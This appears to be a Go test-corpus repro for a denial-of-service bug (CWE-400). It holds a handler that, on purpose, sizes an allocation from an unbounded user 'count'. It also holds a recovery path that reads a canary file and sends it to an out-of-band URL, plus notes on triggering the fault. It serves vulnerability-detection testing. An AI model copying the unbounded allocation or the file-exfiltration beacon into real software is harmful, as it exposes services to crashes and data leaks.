// Package main is a vendored corpus repro for FERRALON-APP-DOS-0001 (uncontrolled resource
// consumption / denial of service, CWE-400). It is the VULNERABLE variant: expandHandler
// sizes an allocation directly from an attacker-controlled `count` with NO upper bound, so a
// large count drives an allocation the runtime cannot satisfy and the process faults.
//
// SOUNDNESS: the canary beacon is intrinsic to the fault-recovery path. expandHandler passes
// the unbounded count straight to make([]byte, n) inside a defer/recover. The recover block —
// reached ONLY when that allocation faults — is the ONLY place that reads the planted seed
// (/tmp/tegron_canary) and beacons it to $TEGRON_OOB_URL?kind=fault&data=<seed>. A request with a
// small count allocates normally, returns OK, and never reads the seed, so it never beacons. On
// the PATCHED build the count is bounded before the allocation, the make never faults, the recover
// block is never entered, and nothing is exfiltrated. This makes a fired beacon attributable to
// the resource-exhaustion fault rather than to a generic exfil.
//
// OBSERVABILITY (load-bearing): the fault MUST be a RECOVERABLE panic, not an OS out-of-memory.
// make([]byte, n) raises a recoverable "makeslice: len out of range" panic ONLY when n exceeds
// Go's compile-time per-slice ceiling (maxAlloc, ~2^48 on amd64). A merely large n (e.g. tens of
// GB) instead drives a real allocation that the runtime fails with an UNRECOVERABLE
// "fatal error: out of memory" — which kills the process before any defer/recover runs, so the
// recover block is never entered and the seed is never beaconed (the live false-negative observed
// as fired=0/3). The trigger therefore drives count AT/NEAR math.MaxInt64 (9223372036854775807),
// which is host-RAM-independent and deterministically trips the recoverable makeslice ceiling.
package main

import (
	"io"
	"net/http"
	"os"
	"strconv"
)

const canarySeedPath = "/tmp/tegron_canary"

// beaconFault is the intrinsic exfil. It is invoked ONLY from the fault-recovery path, so
// reaching it is proof that the unbounded allocation faulted. It reads the planted per-case
// seed and surfaces it to the OOB endpoint tagged kind=fault.
func beaconFault() {
	oob := os.Getenv("TEGRON_OOB_URL")
	if oob == "" {
		return
	}
	seed, err := os.ReadFile(canarySeedPath)
	if err != nil {
		return
	}
	resp, err := http.Get(oob + "?kind=fault&data=" + string(seed))
	if err != nil {
		return
	}
	_, _ = io.Copy(io.Discard, resp.Body)
	_ = resp.Body.Close()
}

func expandHandler(w http.ResponseWriter, r *http.Request) {
	defer func() {
		if rec := recover(); rec != nil {
			// Reached ONLY when the unbounded allocation faulted (the FERRALON-APP-DOS-0001 fault).
			beaconFault()
			w.WriteHeader(http.StatusInternalServerError)
		}
	}()
	n, err := strconv.Atoi(r.URL.Query().Get("count"))
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	// THE VULNERABLE SINK: an attacker-sized allocation with NO upper bound. A large count
	// faults the make, entering the recover path above.
	buf := make([]byte, n)
	_, _ = w.Write([]byte(strconv.Itoa(len(buf))))
}

func main() {
	http.HandleFunc("/expand", expandHandler)
	_ = http.ListenAndServe("127.0.0.1:8080", nil)
}
